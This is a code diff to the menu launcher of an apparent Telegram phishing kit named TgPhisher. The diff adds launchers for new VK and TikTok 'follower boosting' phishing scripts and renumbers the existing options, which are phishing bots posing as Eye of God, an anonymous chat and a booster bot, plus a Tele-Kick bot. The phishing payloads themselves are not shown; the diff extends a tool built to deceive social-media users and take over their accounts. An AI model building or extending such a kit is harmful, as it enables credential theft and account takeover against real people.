@@ -26,6 +26,30 @@ def create_Telekick():
             subprocess.run(["python3", script_path])
         except Exception:
             print("     Обе попытки запустить скрипт не удалось.")
+            
+def create_tt():
+    script_path = os.path.join('data', 'tiktok.py')
+    try:
+        # Попытка запуска через "python"
+        subprocess.run(["python", script_path])
+    except Exception:
+        try:
+            # Попытка запуска через "python3"
+            subprocess.run(["python3", script_path])
+        except Exception:
+            print("     Обе попытки запустить скрипт не удалось.")
+            
+def create_vk():
+    script_path = os.path.join('data', 'vk.py')
+    try:
+        # Попытка запуска через "python"
+        subprocess.run(["python", script_path])
+    except Exception:
+        try:
+            # Попытка запуска через "python3"
+            subprocess.run(["python3", script_path])
+        except Exception:
+            print("     Обе попытки запустить скрипт не удалось.")
 
 def create_sv():
     script_path = os.path.join('data', 'sv.py')
@@ -81,9 +105,11 @@ def display_banner():
                  {yellow}GitHub:{reset} github.com/TheCyberStalker/TgPhisher
                  {blue}  ╔════════════════════════════════════╗
                   {blue} ║ {yellow}1{reset} - {cyan}Запуск фишинг Глаз Бога {blue}       ║
-                 {blue}  ║ {yellow}2{reset} - {cyan}Запуск фишинг Анонимного чата{blue}  ║
-                 {blue}  ║ {yellow}3{reset} - {cyan}Запуск фишинг Накрутчик бота {blue}  ║
-                 {blue}  ║ {yellow}4{reset} - {cyan}Запуск Tele-Kick бота {blue}         ║
+                  {blue} ║ {yellow}2{reset} - {cyan}Запуск фишинг ВК накрутка {blue}     ║
+                  {blue} ║ {yellow}3{reset} - {cyan}Запуск фишинг ТТ накрутка {blue}     ║
+                 {blue}  ║ {yellow}4{reset} - {cyan}Запуск фишинг Анонимного чата{blue}  ║
+                 {blue}  ║ {yellow}5{reset} - {cyan}Запуск фишинг Накрутчик бота {blue}  ║
+                 {blue}  ║ {yellow}6{reset} - {cyan}Запуск Tele-Kick бота {blue}         ║
                   {blue} ║ {yellow}0{reset} - {cyan}Выход                  {blue}        ║
                  {blue}  ╚════════════════════════════════════╝
     """
@@ -98,10 +124,14 @@ def main():
         if choice == "1":
             create_eyeofgod()
         elif choice == "2":
-            create_anonchat()
+            create_vk()
         elif choice == "3":
-            create_sv()
+            create_tt()
         elif choice == "4":
+            create_anonchat()
+        elif choice == "5":
+            create_sv()
+        elif choice == "6":
             create_Telekick()
         elif choice == "0":
             print("Выход из программы...")
